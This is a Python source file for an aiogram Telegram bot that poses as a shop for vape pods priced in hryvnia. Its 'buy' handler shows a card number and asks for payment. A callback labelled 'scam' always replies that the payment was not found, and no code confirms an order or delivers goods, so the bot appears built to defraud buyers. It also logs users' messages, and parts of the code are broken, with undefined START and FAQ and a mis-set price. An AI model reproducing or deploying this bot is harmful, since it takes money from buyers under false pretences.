from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import time
import sqlite3
import random

from config import TOKEN,MY_ID,CARD

from data import VOICES,IMG,CALLBACKS_ELF
import keyboards as kb

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
current_price = 0

dp.middleware.setup(LoggingMiddleware())
#Красивый вывод в терминал
from progress.bar import ShadyBar

print("                Запуск Магазина")
with ShadyBar('Loading', max=10) as bar:
    for i in range(10):
        time.sleep(0.05)
        bar.next()
    print("\n")

from colorama import init
init()
from colorama import Fore, Back, Style

#commands
@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    await message.answer_sticker(r'CAACAgIAAxkBAAEDNc5hgaoMOaeItPkEkioLa-9Sfhh4BwACQhAAAjPFKUmQDtQRpypKgiEE')
    await message.reply(START, reply_markup=kb.markup_start)

@dp.message_handler(commands=['help'])
async def process_help_command(message: types.Message):
    await message.reply("❗️ Для просмотра каталога - нажмите соответствующую кнопку",reply_markup=kb.markup_start)

@dp.message_handler(commands=['shop'])
async def process_shop_command(message: types.Message):
    await message.reply("✨ выберете разновидность пода",reply_markup=kb.markup_shop)

@dp.callback_query_handler(lambda c: c.data == 'faq')
async def process_callback_faq(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text=FAQ,reply_markup=kb.markup_faq)

@dp.callback_query_handler(lambda c: c.data == 'сatalog')
async def process_callback_catolog(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text="✨ выберете разновидность пода",reply_markup=kb.markup_shop)

@dp.callback_query_handler(lambda c: c.data == 'start')
async def process_callback_start(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text="🔥 Главное меню \nДля просмотра каталога - нажмите соответствующую кнопку",reply_markup=kb.markup_start)


#city
@dp.callback_query_handler(lambda c: c.data == 'city')
async def process_callback_city(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text="🏢 Выберите ближайший город",reply_markup=kb.markup_city)

#buy
@dp.callback_query_handler(lambda c: c.data == 'buy')
async def process_callback_buy(callback_query: types.CallbackQuery):
    global current_price
    rand = random.randint(10000,99999)
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text=f" ➖➖➖➖➖➖➖➖➖➖➖\nТовар зарезервирован на складе.\nСовершите платёж на карту, обязательно прикрепив комментарий\n➖➖➖➖➖➖➖➖➖➖➖\n🏷 Карта: {CARD} 🏷\n💵 Сумма: {current_price} гривен.\n💬 Комментарий к платежу: {rand}\n➖➖➖➖➖➖➖➖➖➖➖\nБез комментария оплата не засчитается!",reply_markup=kb.markup_buy)

@dp.callback_query_handler(lambda c: c.data == 'scam')
async def process_callback_scam(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await callback_query.message.edit_text(text="Мы не нашли ваш платеж.\
        \nПросим проверить еще через 2-3 минуты.",reply_markup=kb.markup_scam)


#SECRET
@dp.message_handler(commands=['tof'])
async def process_voice_command(message: types.Message):
    for i in range(len(VOICES[0])):
        await bot.send_voice(message.from_user.id, VOICES[1][i], caption=VOICES[0][i])

#text
@dp.message_handler()
async def echo_message(msg: types.Message):
    print(f"{Fore.GREEN}{msg.from_user.username}:{Fore.WHITE} {msg.text}")
    #await bot.send_message(MY_ID, f"{msg.from_user.username} : {msg.text}",disable_notification=True)

#elf_bar
@dp.callback_query_handler()
async def handler_for_buy(callback_query: types.CallbackQuery):
    current_callback = list(callback_query.data)
    global current_price
    for n in range(len(CALLBACKS_ELF[0])):
        if current_callback[0:len(current_callback)+1] == list(CALLBACKS_ELF[0][n]):
            current_price = CALLBACKS_ELF[0][n]
            await bot.answer_callback_query(callback_query.id)
            if current_callback[8:11] == list("lux"):
                await callback_query.message.edit_text(text="🌺 Выберите Вкус",reply_markup=kb.markup_elf_bar_lux)
            else:
                await callback_query.message.edit_text(text="🌺 Выберите Вкус",reply_markup=kb.markup_elf_bar)

if __name__ == '__main__':
    executor.start_polling(dp)
